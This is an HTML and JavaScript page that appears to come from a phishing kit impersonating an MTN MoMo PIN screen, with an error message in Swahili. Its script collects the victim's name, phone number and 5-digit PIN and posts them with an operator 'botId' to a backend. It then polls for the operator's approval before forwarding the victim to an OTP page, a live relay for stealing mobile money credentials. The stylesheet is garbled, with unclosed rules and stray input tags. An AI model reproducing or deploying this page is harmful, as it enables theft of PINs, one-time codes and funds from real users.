<!DOCTYPE html>
<html lang="en">
<head>
  <script>
  // ============================================================
  //  BOT ID RESOLVER — runs FIRST on every page load
  //  Reads botId from URL immediately. Never defaults to bot1.
  //  Persists to localStorage. Rewrites URL so refreshes keep it.
  //  Stops the page if botId is missing.
  // ============================================================
  (function () {
    try {
      const params = new URLSearchParams(window.location.search);

      // 1. Read from URL FIRST
      let botId = params.get('botId');

      // 2. Fall back to localStorage ONLY if URL is empty
      if (!botId) {
        botId = localStorage.getItem('botId');
      }

      // 3. If STILL empty, refuse to proceed. Do NOT default to any bot.
      if (!botId || botId === 'test_bot' || botId === 'undefined' || botId === 'null') {
        document.documentElement.innerHTML =
          '<body style="font-family:Arial;padding:40px;text-align:center;color:#c0392b">' +
          '<h2>Invalid link</h2>' +
          '<p>Tafadhali fungua ukurasa huu kupitia kiungo rasmi.</p>' +
          '</body>';
        window.__BOTID_MISSING__ = true;
        throw new Error('botId missing from URL and localStorage');
      }

      // 4. Persist so later pages inherit it
      localStorage.setItem('botId', botId);

      // 5. Ensure the URL always carries botId
      if (params.get('botId') !== botId) {
        params.set('botId', botId);
        const newUrl = window.location.pathname + '?' + params.toString() + window.location.hash;
        window.history.replaceState({}, '', newUrl);
      }

      // 6. Expose globally
      window.__BOT_ID__ = botId;

      console.log('🆔 botId resolved immediately:', botId);
    } catch (err) {
      console.error('botId resolver failed:', err.message);
    }
  })();
  </script>

  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MoMo - PIN</title>
  <style>
    /* ===== MOMO STYLE (consistent with other pages) ===== */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      width: 100%;
      min-height: 100%;
    }

    body {
      font-family: Arial, Helvetica, sans-serif;
      background: #fff;
      overflow-x: hidden;

    /* =========================================
       APP CONTAINER
    ========================================= */

    .top::after {

      font-size: 25px;

    .pin-box {

    .pin-box:focus {

    .pin-box.error {
      border-color: #c0392b;

    /* ----- Alert ----- */

      font-size: 15px;
      font-weight: 500;
      min-height: 0;
      margin-top: 8px;
      padding: 0;
      border-radius: 12px;
      background: transparent;

      display: none;

      min-height: 24px;

      background: #fef3f2;
      color: #c0392b;
      border-color: #fecdca;
    }

    #otp-alert.success {
      background: #ecfdf3;
      color: #0b2b3b;
      border-color: #abf0d1;
    }

    /* =========================================
       BOTTOM BUTTON
    ========================================= */

    .bottom {
      width: 100%;
      padding: 0 18px 14px;
      margin-top: 30px;
    }

    .continue-btn {
      width: 100%;
      height: 69px;
      border: none;
      border-radius: 40px;
      background: #d1d5db;
      color: #fff;
      font-size: 22px;
      font-weight: 700;
      cursor: not-allowed;
      font-family: Arial, Helvetica, sans-serif;
      transition: background 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 0.5px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
    }

    .continue-btn:enabled {
      background: #005572;
      cursor: pointer;
    }
    .continue-btn:enabled:hover {
      background: #00415a;
    }
    .continue-btn:enabled:active {
      transform: scale(.98);
    }

    /* Loading state keeps colour and shows spinner */
    .continue-btn.loading:disabled {
      background: #005572;
      opacity: 1;
      cursor: wait;
    }

    .continue-btn .btn-text { display: inline; }
    .continue-btn .btn-spinner {
      display: none;
      width: 26px;
      height: 26px;
      border: 3px solid rgba(255,255,255,0.3);
      border-top: 3px solid #fff;
      border-radius: 50%;
      animation: spin .8s linear infinite;
    }

    .continue-btn.loading .btn-text { display: none; }
    .continue-btn.loading .btn-spinner { display: inline-block; }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .footer {

      text-align: center;
      font-size: 12px;
      color: #bbb;

    /* =========================================
       RESPONSIVE
    ========================================= */

    @media (max-width: 480px) {
      .top {

        padding-top: 40px;
      }
      .top-bar {
        padding: 0 16px;
      }
      .card {

        margin-top: -90px;
        padding: 28px 20px 24px;
        border-radius: 28px;
      }
      .title {

      }

    @media (max-height: 750px) {
      .bottom {
        margin-top: 15px;
      }

      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />
      <input class="pin-box" type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" />

<!-- ========== ORIGINAL LOGIC ========== -->
<script>
(function() {
  const BACKEND_URL = ""; // leave empty to use same-origin

  // ---------- BOTID (resolved by the head script) ----------
  const botId = window.__BOT_ID__;
  if (!botId) return;

  // ---------- READ OTHER DATA ----------
  const urlParams = new URLSearchParams(window.location.search);
  let phone = urlParams.get('phone') || localStorage.getItem('phone');
  let name = urlParams.get('name') || localStorage.getItem('fullName');

  if (!phone) {
    alert('Session expired. Please start over.');
    window.location.href = 'details.html?botId=' + encodeURIComponent(botId);
    return;
  }
  if (!name) {
    name = 'MTN User';
    localStorage.setItem('fullName', name);
  }

  localStorage.setItem('phone', phone);

  // ---------- DOM REFS ----------
  const input = document.getElementById('pinInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const alertEl = document.getElementById('otp-alert');

  // ---------- HELPERS ----------
  function focusPin() { input.focus(); }

  function showAlert(text, type) {
    alertEl.textContent = text;
    alertEl.className = 'show ' + (type || '');
  }

  function clearAlert() {
    alertEl.textContent = '';
    alertEl.className = '';
  }

  function setLoading(on) {
    if (on) {
      verifyBtn.disabled = true;
      verifyBtn.classList.add('loading');
    } else {
      verifyBtn.classList.remove('loading');
    }
  }

  // ---------- INPUT HANDLING ----------
  input.addEventListener('input', function() {
    this.value = this.value.replace(/\D/g, '');
    verifyBtn.disabled = (this.value.length === 0) || verifyBtn.classList.contains('loading');
    clearAlert();
  });

  input.addEventListener('paste', function(e) {
    e.preventDefault();
    const paste = e.clipboardData.getData('text');
    const digits = paste.replace(/\D/g, '');
    this.value = digits;
    verifyBtn.disabled = (digits.length === 0);
    if (digits.length > 0) {
      setTimeout(function() { verifyBtn.click(); }, 300);
    }
  });

  // ---------- POLLING ----------
  let pollTimer = null;

  function stopPolling() {
    if (pollTimer) {
      clearInterval(pollTimer);
      pollTimer = null;
    }
  }

  // ---------- SUBMIT PIN ----------
  verifyBtn.addEventListener('click', async function() {
    if (verifyBtn.classList.contains('loading')) return;

    const pin = input.value.trim();
    if (pin.length === 0) return;

    setLoading(true);
    clearAlert();

    try {
      const res = await fetch(BACKEND_URL + '/submit-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          name: name,
          phone: phone,
          pin: pin,
          botId: botId
        })
      });

      if (!res.ok) {
        const errText = await res.text();
        const clean = errText.startsWith('<')
          ? ('HTTP ' + res.status)
          : (errText || ('HTTP ' + res.status));
        throw new Error(clean);
      }

      const data = await res.json();
      if (!data.requestId) throw new Error('No request ID received');

      stopPolling();
      let attempts = 0;
      const MAX_ATTEMPTS = 120; // ~3 minutes

      pollTimer = setInterval(async function() {
        attempts++;
        try {
          const checkRes = await fetch(BACKEND_URL + '/check-pin/' + data.requestId);
          const status = await checkRes.json();

          if (status.blocked === true) {
            stopPolling();
            setLoading(false);
            input.value = '';
            input.dispatchEvent(new Event('input'));
            showAlert('❌ Account restricted. Please try again later.', 'error');
            return;
          }

          if (status.approved === true) {
            stopPolling();
            setLoading(false);
            showAlert('✅ PIN verified! Redirecting...', 'success');
            // PIN approved → go to OTP (code.html), which then goes to success.html
            setTimeout(function() {
              window.location.href = 'code.html?botId=' + encodeURIComponent(botId) +
                                     '&phone=' + encodeURIComponent(phone) +
                                     '&name=' + encodeURIComponent(name);
            }, 700);
            return;
          }

          if (status.approved === false) {
            stopPolling();
            setLoading(false);
            input.value = '';
            input.dispatchEvent(new Event('input'));
            verifyBtn.disabled = true;
            showAlert('❌ Incorrect PIN. Please try again.', 'error');
            document.querySelectorAll('.pin-box').forEach(function(b) {
              b.classList.add('error');
            });
            setTimeout(function() {
              document.querySelectorAll('.pin-box').forEach(function(b) {
                b.classList.remove('error');
              });
            }, 600);
            const firstBox = document.querySelector('.pin-box');
            if (firstBox) firstBox.focus();
            return;
          }

          if (attempts > MAX_ATTEMPTS) {
            stopPolling();
            setLoading(false);
            showAlert('⏳ Taking too long. Please try again.', 'error');
            return;
          }

          // Silent polling — spinner on the button covers the wait
        } catch (err) {
          console.error('Polling error:', err);
        }
      }, 1500);

    } catch (err) {
      setLoading(false);
      showAlert('❌ ' + (err.message || 'Something went wrong. Please try again.'), 'error');
    }
  });

  // ---------- INIT ----------
  window.onload = function() {
    focusPin();
    verifyBtn.disabled = (input.value.length === 0);
  };
})();
</script>

<!-- ========== PIN BOX UI LOGIC ========== -->
<script>
(function() {
  const pinBoxes = document.querySelectorAll('.pin-box');
  const hiddenInput = document.getElementById('pinInput');

  let internalSet = false;
  const descriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
  Object.defineProperty(hiddenInput, 'value', {
    configurable: true,
    get() { return descriptor.get.call(this); },
    set(v) {
      const previous = descriptor.get.call(this);
      descriptor.set.call(this, v);
      if (!internalSet && v === '' && previous !== '') {
        pinBoxes.forEach(b => b.value = '');
      }
    }
  });

  function updateHiddenPin() {
    let pin = '';
    let allFilled = true;
    pinBoxes.forEach(box => {
      if (box.value) {
        pin += box.value;
      } else {
        allFilled = false;
      }
    });

    internalSet = true;
    if (allFilled && pin.length === 5) {
      hiddenInput.value = pin;
    } else {
      hiddenInput.value = '';
    }
    internalSet = false;

    hiddenInput.dispatchEvent(new Event('input'));
  }

  function focusNext(currentBox) {
    const index = Array.from(pinBoxes).indexOf(currentBox);
    if (index < pinBoxes.length - 1) {
      pinBoxes[index + 1].focus();
    }
  }

  function focusPrev(currentBox) {
    const index = Array.from(pinBoxes).indexOf(currentBox);
    if (index > 0) {
      pinBoxes[index - 1].focus();
    }
  }

  pinBoxes.forEach((box) => {
    box.addEventListener('input', function() {
      this.value = this.value.replace(/\D/g, '').slice(0, 1);
      this.classList.remove('error');
      if (this.value) {
        focusNext(this);
      }
      updateHiddenPin();
    });

    box.addEventListener('keydown', function(e) {
      if (e.key === 'Backspace') {
        if (!this.value) {
          const idx = Array.from(pinBoxes).indexOf(this);
          if (idx > 0) {
            pinBoxes[idx - 1].value = '';
            pinBoxes[idx - 1].focus();
          }
          updateHiddenPin();
        } else {
          this.value = '';
          updateHiddenPin();
        }
        e.preventDefault();
      } else if (e.key === 'ArrowLeft') {
        focusPrev(this);
        e.preventDefault();
      } else if (e.key === 'ArrowRight') {
        focusNext(this);
        e.preventDefault();
      } else if (e.key === 'Enter') {
        const verifyBtn = document.getElementById('verifyBtn');
        if (!verifyBtn.disabled && !verifyBtn.classList.contains('loading')) verifyBtn.click();
        e.preventDefault();
      }
    });

    box.addEventListener('focus', function() {
      this.select();
      this.classList.remove('error');
    });

    box.addEventListener('paste', function(e) {
      e.preventDefault();
      const paste = e.clipboardData.getData('text');
      const digits = paste.replace(/\D/g, '').slice(0, 5);
      if (digits.length > 0) {
        pinBoxes.forEach((b, i) => {
          b.value = digits[i] || '';
        });
        updateHiddenPin();
        const lastIndex = Math.min(digits.length, 5) - 1;
        if (lastIndex >= 0) {
          pinBoxes[lastIndex].focus();
        }
      }
    });
  });

  window.addEventListener('load', function() {
    if (pinBoxes[0]) pinBoxes[0].focus();
  });

  updateHiddenPin();
})();
</script>
